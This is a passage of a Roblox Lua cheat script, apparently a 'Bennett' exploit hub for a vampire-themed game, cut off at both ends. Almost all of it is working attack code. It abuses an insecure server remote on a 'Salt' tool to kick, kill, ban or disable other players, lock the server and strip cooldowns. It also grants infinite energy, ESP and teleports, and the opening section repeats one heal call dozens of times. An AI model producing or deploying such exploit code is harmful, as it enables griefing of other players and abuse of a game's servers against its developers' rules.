game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
local args = {
    [1] = "Healing",
    [2] = workspace:WaitForChild("Map"):WaitForChild("Interactables"):WaitForChild(" ")
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))
		end
wait(.0000000000000000000000000000000000000000000000000001)
end
end

BennettSection:NewToggle("Auto Self Heal", "", function(Value)
    print("You just clicked the bind")
		_G.AutoPunc = Value
                AutoPunc()
        end)

--auto things

_G.Auto = true

function Auto()

while _G.Auto == true do
    local Player = game.Players.LocalPlayer
	local Character = Player.Character
	local Live = game.Workspace.Players
	local RunService = game:GetService("RunService")
	local Debounce = false
        local plr = game:GetService("Players").LocalPlayer
if game.Players.LocalPlayer.Character:FindFirstChild("IncendiaOn") then
    local args = {
        [1] = "regelo",
        [3] = CFrame.new(539.5877075195312, 8.34758472442627, 201.50225830078125, 0.34048065543174744, 0.017015725374221802, -0.9400975704193115, -1.7474732771916024e-10, 0.999836266040802, 0.01809699274599552, 0.9402515292167664, -0.006161675788462162, 0.34042489528656006)
    }

    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent"):FireServer(unpack(args))
end
wait(.0000000000000000000000000000000000000000000000000001)
end
end

BennettSection:NewToggle("Auto Regelo", "", function(Value)
    print("You just clicked the bind")
		_G.Auto = Value
                Auto()
        end)

BennettSection:NewButton("Get Hopes blood", "", function()
local args = {
    [1] = "HopeBlood"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Dialog"):FireServer(unpack(args))


end)

local BennettSection = Bennett:NewSection("Affect All (Remover, Salt)")


BennettSection:NewButton("Kick All", "", function()
    local Plr = game.Players.LocalPlayer
    for i, Player in pairs (game.Players:GetPlayers()) do

        if Player.Character ~= nil and Player ~= Plr then
            local mag = (Player.Character.UpperTorso.Position - Plr.Character.UpperTorso.Position).magnitude
            if mag < 10000000 then
                local Target = Player.Character or Player.CharacterAdded:Wait()

 -- Script generated by Bennett Spy - discord: bennettscripts
bennettscripts = {
    [1] = game.Players[Target.Name..""]
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))

            end
        end
end   
end)

BennettSection:NewButton("Kill All", "", function()
    local Plr = game.Players.LocalPlayer
    for i, Player in pairs (game.Players:GetPlayers()) do

        if Player.Character ~= nil and Player ~= Plr then
            local mag = (Player.Character.UpperTorso.Position - Plr.Character.UpperTorso.Position).magnitude
            if mag < 10000000 then
                local Target = Player.Character or Player.CharacterAdded:Wait()

 -- Script generated by Bennett Spy - discord: bennettscripts
bennettscripts = {
    [1] = Target.Head
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))

            end
        end
end   
end)

local Admin = BennettWindow:NewTab("Admin")
local AdminSection = Admin:NewSection("Admin")
AdminSection:NewButton("Enable Admin", "ButtonInfo", function()
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local targetPlayerName = nil
local cooldownPlayers = {}
local bannedPlayers = {}
local serverLocked = false

local BackpackSalt
local HoldingSalt

-- Function to update salt references
local function updateSaltReferences()
    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    local backpack = localPlayer:WaitForChild("Backpack")
    BackpackSalt = backpack:FindFirstChild("Salt")
    HoldingSalt = character:FindFirstChild("Salt")
end

-- Function to find the closest matching player name
local function findClosestPlayerName(partialName)
    local closestMatch = nil
    local closestDistance = math.huge

    for _, player in pairs(Players:GetPlayers()) do
        local distance = math.abs(#player.Name - #partialName)
        if distance < closestDistance and string.sub(player.Name, 1, #partialName):lower() == partialName:lower() then
            closestMatch = player
            closestDistance = distance
        end
    end

    return closestMatch
end

-- Function to find the closest matching banned player name
local function findClosestBannedPlayerName(partialName)
    local closestMatch = nil
    local closestDistance = math.huge

    for name, _ in pairs(bannedPlayers) do
        local distance = math.abs(#name - #partialName)
        if distance < closestDistance and string.sub(name, 1, #partialName):lower() == partialName:lower() then
            closestMatch = name
            closestDistance = distance
        end
    end

    return closestMatch
end

-- Function to start no cooldown on a player
local function startNoCooldown(player)
    cooldownPlayers[player.Name] = true
    spawn(function()
        while cooldownPlayers[player.Name] do
            if player and player:FindFirstChild("Cooldown") then
                for _, v in pairs(player.Cooldown:GetChildren()) do
                    local args = { v }

                    if BackpackSalt and BackpackSalt.Event then
                        BackpackSalt.Event:FireServer(unpack(args))
                    end
                    if HoldingSalt and HoldingSalt.Event then
                        HoldingSalt.Event:FireServer(unpack(args))
                    end
                end
            end
            wait(0.1)
        end
    end)
end

-- Function to stop no cooldown on a player
local function stopNoCooldown(player)
    cooldownPlayers[player.Name] = false
end

-- Function to kick a player
local function kickPlayer(player)
    local args = { player }

    if BackpackSalt and BackpackSalt.Event then
        BackpackSalt.Event:FireServer(unpack(args))
    end
    if HoldingSalt and HoldingSalt.Event then
        HoldingSalt.Event:FireServer(unpack(args))
    end
end

-- Function to disable a player
local function disablePlayer(player)
    local statsPath = game:GetService("Workspace").Players:FindFirstChild(player.Name) and game:GetService("Workspace").Players[player.Name]:FindFirstChild("Stats")
    if statsPath then
        local args = { statsPath }
        if BackpackSalt and BackpackSalt.Event then
            BackpackSalt.Event:FireServer(unpack(args))
        end
        if HoldingSalt and HoldingSalt.Event then
            HoldingSalt.Event:FireServer(unpack(args))
        end
        print("Disabled stats of: " .. player.Name)
    else
        print("Stats not found for player: " .. player.Name)
    end
end

-- Function to kill a player
local function killPlayer(player)
    local head = game:GetService("Workspace").Players:FindFirstChild(player.Name) and game:GetService("Workspace").Players[player.Name]:FindFirstChild("Head")
    if head then
        local args = { head }
        if BackpackSalt and BackpackSalt.Event then
            BackpackSalt.Event:FireServer(unpack(args))
        end
        if HoldingSalt and HoldingSalt.Event then
            HoldingSalt.Event:FireServer(unpack(args))
        end
        print("Killed player: " .. player.Name)
    else
        print("Head not found for player: " .. player.Name)
    end
end

-- Event listener for new players joining
Players.PlayerAdded:Connect(function(player)
    if serverLocked and player ~= localPlayer then
        kickPlayer(player)
    end
    if bannedPlayers[player.Name] then
        kickPlayer(player)
    end
end)

-- Event listener for character respawn
localPlayer.CharacterAdded:Connect(function()
    updateSaltReferences()
end)

-- Event listener for changes in the backpack
localPlayer.Backpack.ChildAdded:Connect(function(child)
    if child.Name == "Salt" then
        updateSaltReferences()
    end
end)

-- Event listener for changes in the character
localPlayer.Character.ChildAdded:Connect(function(child)
    if child.Name == "Salt" then
        updateSaltReferences()
    end
end)

-- Initial update of salt references
updateSaltReferences()

-- Event listener for chat messages
localPlayer.Chatted:Connect(function(message)
    if string.sub(message, 1, 5) == "!kick" then
        local playerNameToTarget = string.sub(message, 7)
        local targetPlayer = findClosestPlayerName(playerNameToTarget)

        if targetPlayer then
            targetPlayerName = targetPlayer.Name
            kickPlayer(targetPlayer)
            print("Kicked player: " .. targetPlayerName)
        else
            print("Target player not found: " .. tostring(playerNameToTarget))
        end
    elseif string.sub(message, 1, 5) == "!kill" then
        local playerNameToKill = string.sub(message, 7)
        if playerNameToKill == "all" then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    killPlayer(player)
                end
            end
        elseif playerNameToKill == "others" then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    killPlayer(player)
                end
            end
        else
            local targetPlayer = findClosestPlayerName(playerNameToKill)
            if targetPlayer then
                killPlayer(targetPlayer)
            else
                print("Target player not found: " .. tostring(playerNameToKill))
            end
        end
    elseif string.sub(message, 1, 6) == "!nocd " then
        local playerNameToNoCD = string.sub(message, 7)
        if playerNameToNoCD == "all" then
            for _, player in pairs(Players:GetPlayers()) do
                startNoCooldown(player)
            end
        elseif playerNameToNoCD == "others" then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    startNoCooldown(player)
                end
            end
        else
            local targetPlayer = findClosestPlayerName(playerNameToNoCD)
            if targetPlayer then
                startNoCooldown(targetPlayer)
            else
                print("Target player not found: " .. tostring(playerNameToNoCD))
            end
        end
    elseif string.sub(message, 1, 4) == "!cd " then
        local playerNameToCD = string.sub(message, 5)
        if playerNameToCD == "all" then
            for _, player in pairs(Players:GetPlayers()) do
                stopNoCooldown(player)
            end
        elseif playerNameToCD == "others" then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    stopNoCooldown(player)
                end
            end
        else
            local targetPlayer = findClosestPlayerName(playerNameToCD)
            if targetPlayer then
                stopNoCooldown(targetPlayer)
            else
                print("Target player not found: " .. tostring(playerNameToCD))
            end
        end
    elseif string.sub(message, 1, 5) == "!ban " then
        local playerNameToBan = string.sub(message, 6)
        local targetPlayer = findClosestPlayerName(playerNameToBan)

        if targetPlayer then
            bannedPlayers[targetPlayer.Name] = true
            kickPlayer(targetPlayer)
            print("Banned player: " .. targetPlayer.Name)
        else
            print("Target player not found: " .. tostring(playerNameToBan))
        end
    elseif string.sub(message, 1, 7) == "!unban " then
        local playerNameToUnban = string.sub(message, 8)
        local targetPlayerName = findClosestBannedPlayerName(playerNameToUnban)

        if targetPlayerName then
            bannedPlayers[targetPlayerName] = nil
            print("Unbanned player: " .. targetPlayerName)
        else
            print("Banned player not found: " .. tostring(playerNameToUnban))
        end
    elseif string.sub(message, 1, 9) == "!disable " then
        local playerNameToDisable = string.sub(message, 10)
        if playerNameToDisable == "all" then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    disablePlayer(player)
                end
            end
        elseif playerNameToDisable == "others" then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    disablePlayer(player)
                end
            end
        else
            local targetPlayer = findClosestPlayerName(playerNameToDisable)
            if targetPlayer then
                disablePlayer(targetPlayer)
            else
                print("Target player not found: " .. tostring(playerNameToDisable))
            end
        end
    elseif message == "!slock" then
        serverLocked = true
        print("Server locked: New players will be kicked")
    elseif message == "!unslock" then
        serverLocked = false
        print("Server unlocked: New players can join")
    end
end)

-- Continuously check and perform actions
while true do
    if targetPlayerName then
        local targetPlayer = Players:FindFirstChild(targetPlayerName)

        if targetPlayer then
            local args = { targetPlayer }

            if BackpackSalt and BackpackSalt.Event then
                BackpackSalt.Event:FireServer(unpack(args))
            end
            if HoldingSalt and HoldingSalt.Event then
                HoldingSalt.Event:FireServer(unpack(args))
            end
        else
            print("Target player not found: " .. tostring(targetPlayerName))
        end
    end

    -- Checks for other children with specific names under the local player
    for i, v in pairs(localPlayer:GetChildren()) do
        if v.Name == "Cured" or v.Name == "Healed" then
            local args = { v }
            if BackpackSalt and BackpackSalt.Event then
                BackpackSalt.Event:FireServer(unpack(args))
            end
            if HoldingSalt and HoldingSalt.Event then
                HoldingSalt.Event:FireServer(unpack(args))
            end
        end
    end
    
    wait(0.1)
end



end)




local Bennett = BennettWindow:NewTab("Vampire")
local BennettSection = Bennett:NewSection("Vampire")

--auto things

_G.AutoPunch = true

function AutoPunch()

while _G.AutoPunch == true do
local args = {
    [1] = -2000,
    [2] = false
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Gameplay"):WaitForChild("Energy"):FireServer(unpack(args))
local args = {
    [1] = -2000,
    [2] = false
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Gameplay"):WaitForChild("Energy"):FireServer(unpack(args))
local args = {
    [1] = -2000,
    [2] = false
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Gameplay"):WaitForChild("Energy"):FireServer(unpack(args))
wait(.0000000000000000000000000000000000000000000000000001)
end
end

BennettSection:NewToggle("Inf Energy", "Restoring", function(Value)
    print("You just clicked the bind")
		_G.AutoPunch = Value
                AutoPunch()
        end)

BennettSection:NewButton("Self turn vampire", "", function()

local ohString1 = "TurnVampire"
local ohInstance2 = game.Players.LocalPlayer.Character

game:GetService("ReplicatedStorage").Events.System.Dialog:FireServer(ohString1, ohInstance2)


end)

--auto things

_G.AutoPu = true

function AutoPu()

while _G.AutoPu == true do
local args = {
    [1] = "Self Siphon",
    [2] = "start",
    [3] = game.Players.LocalPlayer.Character
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("Siphon"):FireServer(unpack(args))
wait(0.1)
end
end

BennettSection:NewToggle("Advanced Siphon", "", function(Value)
    print("You just clicked the bind")
		_G.AutoPu = Value
                AutoPu()
        end)

local Bennett = BennettWindow:NewTab("Teleports")
local BennettSection = Bennett:NewSection("Teleports")
BennettSection:NewTextBox("Teleport To Someone", "", function(txt)
    local Players = game:GetService("Players")
    local msg = txt
    local function findPlayer(stringg)
        for _, v in pairs(Players:GetPlayers()) do
            if stringg:lower() == (v.Name:lower()):sub(1, #stringg) then
                return v
            end
        end
    end

    local player = findPlayer(msg)
    local CHAR = player.Character
    
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
      
end)
BennettSection:NewButton("Witch Shop", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(187, 10, 192))
end)
BennettSection:NewButton("School", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-34, 11, 52))
end)
BennettSection:NewButton("The Tomb", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(755, 9, 152))
end)
BennettSection:NewButton("Old Witch House", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(1063, 10, -4))
end)
BennettSection:NewButton("Ancestral Well", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(945, 9, 127))
end)
BennettSection:NewButton("Middle", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(404, 19, 262))
end)
BennettSection:NewButton("Weapons Store", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(345, 10, 430))
end)
BennettSection:NewButton("Bells", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(324, 10, -61))
end)
BennettSection:NewButton("Salvatore School", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(333, 10, 864))
end)
BennettSection:NewButton("The Cure", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(116, -35, 676))
end)
BennettSection:NewButton("Malivore", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(39, -126, 134))
end)
BennettSection:NewButton("Freyas Pendant", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-36, -62, -239))
end)
BennettSection:NewButton("Spawn", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(55, -210, -250))
end)
BennettSection:NewButton("Qetsiyah House", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-93, 11, 256))
end)
BennettSection:NewButton("Blood Bags", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-346, 10, 390))
end)
BennettSection:NewButton("Greek Ruins", "", function()
      game.Players.LocalPlayer.Character:MoveTo(Vector3.new(882, 14, 221))
end)
local Bennett = BennettWindow:NewTab("Specie Change")
local BennettSection = Bennett:NewSection("You can change your specie now!")
BennettSection:NewButton("Mortal", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Mortal"
end)
BennettSection:NewButton("Werewolf", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Werewolf"
end)
BennettSection:NewButton("Witch", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Witch"
end)
BennettSection:NewButton("Siphoner", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Siphoner"
end)
BennettSection:NewButton("Werewitch", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Werewitch"
end)
BennettSection:NewButton("Vampire", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Vampire"
end)
BennettSection:NewButton("Hybrid", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Hybrid"
end)
BennettSection:NewButton("Heretic", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Heretic"
end)
BennettSection:NewButton("Tribrid", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Tribrid"
end)
BennettSection:NewButton("Siren", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "Siren"
end)
BennettSection:NewButton("God", "", function()
game.Players.LocalPlayer.Character.Stats.Species.Value = "God"
end)
local Bennett = BennettWindow:NewTab("Target")
local BennettSection = Bennett:NewSection("Target (Remover, Salt)")

local Players = game:GetService("Players")

local function createUniquePinkESP(player)
    if player and player.Character then
        local character = player.Character
        local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
        if torso then
            local billboardGui = Instance.new("BillboardGui")
            billboardGui.Name = "UniquePinkESP_" .. player.Name
            billboardGui.Size = UDim2.new(0, 50, 0, 50) -- Adjust the size as needed
            billboardGui.Adornee = torso
            billboardGui.AlwaysOnTop = true

            
            local espFrame = Instance.new("Frame")
            espFrame.Size = UDim2.new(1, 0, 1, 0)
            espFrame.BackgroundTransparency = 0.5
            espFrame.BorderSizePixel = 2
            espFrame.BorderColor3 = Color3.fromRGB(255, 105, 180) 
            espFrame.BackgroundColor3 = Color3.fromRGB(255, 192, 203) 
            espFrame.Parent = billboardGui

            
            local espText = Instance.new("TextLabel")
            espText.Size = UDim2.new(1, 0, 1, 0)
            espText.Font = Enum.Font.SourceSansBold
            espText.TextSize = 15
            espText.TextColor3 = Color3.fromRGB(255, 105, 180) 
            espText.BackgroundTransparency = 1
            espText.TextStrokeTransparency = 0
            espText.TextStrokeColor3 = Color3.fromRGB(255, 255, 255) 
            espText.Text = player.Name
            espText.Parent = espFrame

            billboardGui.Parent = game:GetService("CoreGui")
            return billboardGui
        end
    end
end


local function destroyUniquePinkESP(player)
    local gui = game:GetService("CoreGui"):FindFirstChild("UniquePinkESP_" .. player.Name)
    if gui then
        gui:Destroy()
    end
end


BennettSection:NewTextBox("Player Esp", "", function(txt)
    local msg = txt
    local player = nil
    local function findPlayer(stringg)
        for _, v in pairs(Players:GetPlayers()) do
            if stringg:lower() == (v.Name:lower()):sub(1, #stringg) then
                player = v
                return v
            end
        end
    end

    findPlayer(msg)
    if player then
        createUniquePinkESP(player)
    end
end)


BennettSection:NewButton("Destroy Esp", "", function()
    for _, player in ipairs(Players:GetPlayers()) do
        destroyUniquePinkESP(player)
    end
end)


BennettSection:NewTextBox("Kick", "", function(txt)
    local Players = game:GetService("Players")
    local msg = txt
    local function findPlayer(stringg)
        for _, v in pairs(Players:GetPlayers()) do
            if stringg:lower() == (v.Name:lower()):sub(1, #stringg) then
                return v
            end
        end
    end

    local player = findPlayer(msg)
    local CHAR = player.Character
    
 -- Script generated by Bennett Spy - discord: bennettscripts
bennettscripts = {
    [1] = game.Players[player.Name..""]
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))
      
end)

BennettSection:NewTextBox("Kill", "", function(txt)
    local Players = game:GetService("Players")
    local msg = txt
    local function findPlayer(stringg)
        for _, v in pairs(Players:GetPlayers()) do
            if stringg:lower() == (v.Name:lower()):sub(1, #stringg) then
                return v
            end
        end
    end

    local player = findPlayer(msg)
    local CHAR = player.Character
    
 -- Script generated by Bennett Spy - discord: bennettscripts
bennettscripts = {
    [1] = player.Character.Head
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))
      
end)

BennettSection:NewTextBox("No cd", "", function(txt)
    local Players = game:GetService("Players")
    local msg = txt
    local function findPlayer(stringg)
        for _, v in pairs(Players:GetPlayers()) do
            if stringg:lower() == (v.Name:lower()):sub(1, #stringg) then
                return v
            end
        end
    end

    local player = findPlayer(msg)
    local CHAR = player.Character

game.Players[player.Name..""].Cooldown.ChildAdded:Connect(function(child)
game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(child)
end)
end)

BennettSection:NewTextBox("LoopDel Channel", "", function(txt)
    local Players = game:GetService("Players")
    local msg = txt
    local function findPlayer(stringg)
        for _, v in pairs(Players:GetPlayers()) do
            if stringg:lower() == (v.Name:lower()):sub(1, #stringg) then
                return v
            end
        end
    end

    local player = findPlayer(msg)
    local CHAR = player.Character
    
while wait() do
 -- Script generated by Bennett Spy - discord: bennettscripts
bennettscripts = {
